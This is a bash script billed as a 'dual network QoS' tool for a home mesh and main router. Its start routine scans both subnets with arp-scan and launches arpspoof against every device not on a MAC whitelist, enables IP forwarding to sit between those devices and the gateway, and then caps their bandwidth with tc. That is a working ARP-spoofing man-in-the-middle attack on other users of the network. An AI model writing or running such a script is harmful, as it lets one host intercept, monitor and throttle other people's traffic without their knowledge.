#!/bin/bash
# Two-Tier QoS for Dual Network (Mesh & Main Router)
# Usage: sudo ./qos_dual_network.sh start|stop

# === NETWORK CONFIGURATION ===
MESH_INTERFACE="wlan1"           # Your mesh WiFi interface
MAIN_INTERFACE="eth0"            # Your main network interface (if connected)

MESH_GATEWAY="192.168.68.1"      # Mesh router IP
MAIN_GATEWAY="192.168.1.254"     # Main router IP

MESH_NETWORK="192.168.68.0/24"   # Mesh subnet
MAIN_NETWORK="192.168.1.0/24"    # Main subnet

TOTAL_BANDWIDTH="100mbit"        # Your total internet bandwidth

# Bandwidth allocation
HIGH_PRIORITY_PERCENT=70         # 80% for high priority
LOW_PRIORITY_PERCENT=30         # 20% for everything else

# === HIGH PRIORITY MAC LIST (Edit This) ===
# List MAC addresses; script finds their current IPs via arp-scan. Format: aa:bb:cc:dd:ee:ff or aa-bb-cc-dd-ee-ff
# Run "$0 scan" to see IP,MAC on your networks and add MACs here. Gateways are always high-priority by IP.
HIGH_PRIORITY_MACS=(
    "70:cd:0d:da:eb:d4"     # Your Kali machine (on mesh)
    "4a:4e:51:88:43:67"     # Your gaming PC
    "de:82:7e:56:ee:66"     # Your gaming PC
    "c6:9a:64:d0:b8:72"
    "22:45:B0:0F:04:30"     # Your gaming PC
    "fa:4e:11:12:45:c6"
    "0a:ed:01:2f:9d:2c"
#    "38:54:F5:69:CD:B0"     # Liam
)
# =========================================

# Calculate bandwidth rates
calc_rate() {
    local percent=$1
    local total_num=$(echo $TOTAL_BANDWIDTH | sed 's/[^0-9]*//g')
    local rate=$(echo "scale=0; $total_num * $percent / 100" | bc)
    echo "${rate}mbit"
}

HIGH_RATE=$(calc_rate $HIGH_PRIORITY_PERCENT)
LOW_RATE=$(calc_rate $LOW_PRIORITY_PERCENT)

# Normalize MAC for comparison (lowercase, colon-separated)
normalize_mac() {
    local h
    h=$(echo "$1" | tr -d ':- \n' | tr 'A-F' 'a-f')
    [[ ${#h} -ne 12 ]] && echo "" && return
    echo "${h:0:2}:${h:2:2}:${h:4:2}:${h:6:2}:${h:8:2}:${h:10:2}"
}

# Run arp-scan on interface; output lines "IP,MAC" (only lines with valid IP in col1)
arp_scan_ip_mac() {
    local iface="$1"
    sudo arp-scan --interface="$iface" --localnet 2>/dev/null | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ && $2 != "" {print $1 "," $2}'
}

echo "=== Dual Network QoS Configuration ==="
echo "Mesh Network: $MESH_NETWORK via $MESH_GATEWAY"
echo "Main Network: $MAIN_NETWORK via $MAIN_GATEWAY"
echo "Total Bandwidth: $TOTAL_BANDWIDTH"
echo ""
echo "Bandwidth Allocation:"
echo "  High Priority (${HIGH_PRIORITY_PERCENT}%): $HIGH_RATE"
echo "  Low Priority (${LOW_PRIORITY_PERCENT}%): $LOW_RATE"
echo ""
echo "High Priority MACs (IPs resolved from arp-scan at start):"
for mac in "${HIGH_PRIORITY_MACS[@]}"; do
    [[ -n "$mac" ]] && echo "  - $mac"
done
echo "====================================="

# Function to get active interface for an IP
get_interface_for_ip() {
    local ip=$1
    if [[ $ip == 192.168.68.* ]]; then
        echo "$MESH_INTERFACE"
    elif [[ $ip == 192.168.1.* ]]; then
        echo "$MAIN_INTERFACE"
    else
        echo "$MESH_INTERFACE"  # default
    fi
}

start_qos() {
    echo "[+] Enabling IP forwarding..."
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    echo "[+] Starting ARP spoofing for non-priority devices on BOTH networks..."
    
    # One arp-scan per interface; resolve high-priority IPs from MACs
    echo "  Scanning Mesh Network ($MESH_NETWORK) via $MESH_INTERFACE..."
    MESH_SCAN=$(arp_scan_ip_mac $MESH_INTERFACE)
    mapfile -t MESH_IPS < <(echo "$MESH_SCAN" | cut -d',' -f1 | sort -u)
    HIGH_PRIORITY_IPS_RESOLVED=()
    while IFS=',' read -r ip mac; do
        [[ -z "$ip" || -z "$mac" ]] && continue
        norm=$(normalize_mac "$mac")
        for m in "${HIGH_PRIORITY_MACS[@]}"; do
            [[ -z "$m" ]] && continue
            if [[ "$(normalize_mac "$m")" == "$norm" ]]; then
                HIGH_PRIORITY_IPS_RESOLVED+=("$ip")
                echo "    High priority (MAC match): $ip ($mac)"
                break
            fi
        done
    done < <(echo "$MESH_SCAN")
    if ip link show $MAIN_INTERFACE >/dev/null 2>&1; then
        echo "  Scanning Main Network ($MAIN_NETWORK) via $MAIN_INTERFACE..."
        MAIN_SCAN=$(arp_scan_ip_mac $MAIN_INTERFACE)
        mapfile -t MAIN_IPS < <(echo "$MAIN_SCAN" | cut -d',' -f1 | sort -u)
        while IFS=',' read -r ip mac; do
            [[ -z "$ip" || -z "$mac" ]] && continue
            norm=$(normalize_mac "$mac")
            for m in "${HIGH_PRIORITY_MACS[@]}"; do
                [[ -z "$m" ]] && continue
                if [[ "$(normalize_mac "$m")" == "$norm" ]]; then
                    HIGH_PRIORITY_IPS_RESOLVED+=("$ip")
                    echo "    High priority (MAC match): $ip ($mac)"
                    break
                fi
            done
        done < <(echo "$MAIN_SCAN")
    else
        MAIN_IPS=()
    fi
    HIGH_PRIORITY_IPS_RESOLVED+=("$MESH_GATEWAY" "$MAIN_GATEWAY")
    
    # ARP spoof only devices not in high-priority list
    for ip in "${MESH_IPS[@]}"; do
        is_high=false
        for high_ip in "${HIGH_PRIORITY_IPS_RESOLVED[@]}"; do
            [[ "$ip" == "$high_ip" ]] && is_high=true && break
        done
        if [[ "$is_high" == false ]]; then
            echo "    Controlling mesh device: $ip"
            sudo arpspoof -i $MESH_INTERFACE -t $ip $MESH_GATEWAY >/dev/null 2>&1 &
            sudo arpspoof -i $MESH_INTERFACE -t $MESH_GATEWAY $ip >/dev/null 2>&1 &
        fi
    done
    for ip in "${MAIN_IPS[@]}"; do
        is_high=false
        for high_ip in "${HIGH_PRIORITY_IPS_RESOLVED[@]}"; do
            [[ "$ip" == "$high_ip" ]] && is_high=true && break
        done
        if [[ "$is_high" == false ]]; then
            echo "    Controlling main network device: $ip"
            sudo arpspoof -i $MAIN_INTERFACE -t $ip $MAIN_GATEWAY >/dev/null 2>&1 &
            sudo arpspoof -i $MAIN_INTERFACE -t $MAIN_GATEWAY $ip >/dev/null 2>&1 &
        fi
    done
    
    echo "[+] Setting up traffic control for both interfaces..."
    
    # Setup Mesh Interface QoS
    echo "  Configuring $MESH_INTERFACE (mesh)..."
    sudo tc qdisc del dev $MESH_INTERFACE root 2>/dev/null
    sudo tc qdisc add dev $MESH_INTERFACE root handle 1: htb default 20
    sudo tc class add dev $MESH_INTERFACE parent 1: classid 1:1 htb rate $TOTAL_BANDWIDTH
    sudo tc class add dev $MESH_INTERFACE parent 1:1 classid 1:10 htb rate $HIGH_RATE ceil $TOTAL_BANDWIDTH prio 0
    sudo tc class add dev $MESH_INTERFACE parent 1:1 classid 1:20 htb rate $LOW_RATE ceil $LOW_RATE prio 1
    
    # Setup Main Interface QoS (if exists)
    if ip link show $MAIN_INTERFACE >/dev/null 2>&1; then
        echo "  Configuring $MAIN_INTERFACE (main)..."
        sudo tc qdisc del dev $MAIN_INTERFACE root 2>/dev/null
        sudo tc qdisc add dev $MAIN_INTERFACE root handle 1: htb default 20
        sudo tc class add dev $MAIN_INTERFACE parent 1: classid 1:1 htb rate $TOTAL_BANDWIDTH
        sudo tc class add dev $MAIN_INTERFACE parent 1:1 classid 1:10 htb rate $HIGH_RATE ceil $TOTAL_BANDWIDTH prio 0
        sudo tc class add dev $MAIN_INTERFACE parent 1:1 classid 1:20 htb rate $LOW_RATE ceil $LOW_RATE prio 1
    fi
    
    echo "[+] Applying IP filters (resolved from MACs + gateways)..."
    
    for ip in "${HIGH_PRIORITY_IPS_RESOLVED[@]}"; do
        [[ -z "$ip" ]] && continue
        INTERFACE=$(get_interface_for_ip "$ip")
        if ! ip link show $INTERFACE >/dev/null 2>&1; then
            continue
        fi
        echo "  High priority: $ip -> $INTERFACE"
        sudo tc filter add dev $INTERFACE protocol ip parent 1:0 \
            prio 0 u32 match ip src $ip flowid 1:10
    done
    
    # Apply default low priority filters
    echo "  Setting low priority for all other IPs..."
    if ip link show $MESH_INTERFACE >/dev/null 2>&1; then
        sudo tc filter add dev $MESH_INTERFACE protocol ip parent 1:0 \
            prio 1 u32 match ip src $MESH_NETWORK flowid 1:20
    fi
    
    if ip link show $MAIN_INTERFACE >/dev/null 2>&1; then
        sudo tc filter add dev $MAIN_INTERFACE protocol ip parent 1:0 \
            prio 1 u32 match ip src $MAIN_NETWORK flowid 1:20
    fi
    
    echo "[✓] Dual Network QoS Active!"
    echo "    High-priority devices (MAC-matched IPs + gateways) get $HIGH_RATE"
    echo "    All other devices limited to $LOW_RATE"
}

stop_qos() {
    echo "[+] Stopping Dual Network QoS..."
    
    # Kill all ARP spoofing
    sudo pkill -f arpspoof 2>/dev/null
    
    # Clear traffic control on both interfaces
    for iface in $MESH_INTERFACE $MAIN_INTERFACE; do
        if ip link show $iface >/dev/null 2>&1; then
            sudo tc qdisc del dev $iface root 2>/dev/null
        fi
    done
    
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward
    
    # Clear ARP cache
    sudo ip neigh flush all
    
    echo "[✓] QoS Stopped on both networks"
}

status_qos() {
    echo "=== Dual Network QoS Status ==="
    
    for iface in $MESH_INTERFACE $MAIN_INTERFACE; do
        if ip link show $iface >/dev/null 2>&1; then
            echo ""
            echo "Interface: $iface"
            echo "------------"
            echo "TC Qdisc:"
            sudo tc -s qdisc show dev $iface 2>/dev/null || echo "  No rules"
            echo ""
            echo "TC Classes:"
            sudo tc -s class show dev $iface 2>/dev/null || echo "  No classes"
            echo ""
        fi
    done
    
    echo "Active ARP spoofing processes:"
    pgrep -af arpspoof || echo "  None"
}

case "$1" in
    start)
        start_qos
        ;;
    stop)
        stop_qos
        ;;
    status)
        status_qos
        ;;
    list)
        echo "High Priority MACs (run start to resolve to IPs via arp-scan):"
        for mac in "${HIGH_PRIORITY_MACS[@]}"; do
            [[ -n "$mac" ]] && echo "  $mac"
        done
        ;;
    scan)
        echo "Scanning both networks (arp-scan --interface=... --localnet)..."
        echo ""
        echo "Mesh Network ($MESH_NETWORK) via $MESH_INTERFACE:"
        sudo arp-scan --interface=$MESH_INTERFACE --localnet 2>/dev/null | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {printf "  %-16s %s\n", $1, $2}' || echo "  (arp-scan failed or no devices)"
        echo ""
        echo "Main Network ($MAIN_NETWORK) via $MAIN_INTERFACE:"
        if ip link show $MAIN_INTERFACE >/dev/null 2>&1; then
            sudo arp-scan --interface=$MAIN_INTERFACE --localnet 2>/dev/null | awk '$1 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/ {printf "  %-16s %s\n", $1, $2}' || echo "  (arp-scan failed or no devices)"
        else
            echo "  (interface $MAIN_INTERFACE not found)"
        fi
        ;;
    add)
        if [[ -n "$2" ]]; then
            newmac=$(normalize_mac "$2")
            if [[ -z "$newmac" ]]; then
                echo "Invalid MAC: $2 (use aa:bb:cc:dd:ee:ff or aa-bb-cc-dd-ee-ff)"
                exit 1
            fi
            echo "Add to HIGH_PRIORITY_MACS in this script: \"$newmac\""
            echo "Then: sudo $0 stop && sudo $0 start"
        else
            echo "Usage: $0 add <MAC_ADDRESS>"
            echo "Example: $0 add aa:bb:cc:dd:ee:ff"
        fi
        ;;
    *)
        echo "Usage: $0 {start|stop|status|list|scan|add}"
        echo ""
        echo "Commands:"
        echo "  start    - Start QoS (resolve IPs from HIGH_PRIORITY_MACS via arp-scan)"
        echo "  stop     - Stop QoS on both networks"
        echo "  status   - Show QoS status"
        echo "  list     - List high priority MACs"
        echo "  scan     - Scan both networks (arp-scan), show IP and MAC"
        echo "  add MAC  - Show how to add a MAC to high-priority list"
        exit 1
        ;;
esac
